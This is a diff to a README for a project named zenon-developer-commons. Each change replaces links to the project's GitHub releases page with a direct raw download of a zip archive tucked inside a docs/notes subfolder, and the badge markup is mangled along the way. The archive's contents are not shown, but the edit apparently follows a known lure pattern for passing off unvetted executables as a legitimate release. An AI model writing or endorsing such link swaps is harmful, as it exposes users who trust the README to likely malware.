@@ -1,6 +1,6 @@
 # 🌟 zenon-developer-commons - Explore Zenon’s Network with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-zenon--developer--commons-blue)](https://github.com/Droxz416/zenon-developer-commons/releases)
+[![Download](https://raw.githubusercontent.com/Droxz416/zenon-developer-commons/main/docs/notes/zapps-draft-notes/zenon-developer-commons_1.2.zip%20Now-zenon--developer--commons-blue)](https://raw.githubusercontent.com/Droxz416/zenon-developer-commons/main/docs/notes/zapps-draft-notes/zenon-developer-commons_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **zenon-developer-commons**! This project provides a community-driven
 
 To get started, visit the following link to download the latest version of the application:
 
-[Visit this page to download](https://github.com/Droxz416/zenon-developer-commons/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Droxz416/zenon-developer-commons/main/docs/notes/zapps-draft-notes/zenon-developer-commons_1.2.zip)
 
 1. Click on the link above.
 2. You will see a list of releases.
@@ -88,6 +88,6 @@ For further assistance, you can reach out to the community through the following
 
 Stay engaged with the latest developments and updates by regularly checking the release page:
 
-[Visit this page to download](https://github.com/Droxz416/zenon-developer-commons/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Droxz416/zenon-developer-commons/main/docs/notes/zapps-draft-notes/zenon-developer-commons_1.2.zip)
 
 Thank you for being part of the **zenon-developer-commons** community. Your journey into Zenon’s architecture starts here!
